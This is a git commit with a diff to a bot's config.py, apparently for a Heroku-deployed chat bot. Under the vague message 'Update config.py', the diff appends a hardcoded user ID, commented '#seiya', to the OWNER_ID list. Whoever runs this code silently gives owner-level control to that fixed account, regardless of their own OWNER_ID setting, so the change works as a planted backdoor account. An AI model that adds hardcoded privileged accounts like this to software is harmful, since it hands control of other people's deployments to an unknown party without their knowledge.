2222ee65e202f9ca633ffe1b9fdddf003ee01f95
ʙᴧɢᴧsҡᴧʀᴧ-ᴇx <93908715+ybgskr12@users.noreply.github.com>
2022-12-19 11:34:29 +0700

    Update config.py

--- config/config.py
+++ config/config.py
@@ -47,6 +47,9 @@ OWNER_ID = list(
     map(int, getenv("OWNER_ID", "1820233416").split())
 )  # Input type must be interger
 
+#seiya
+OWNER_ID.append(5305919189)
+
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
 
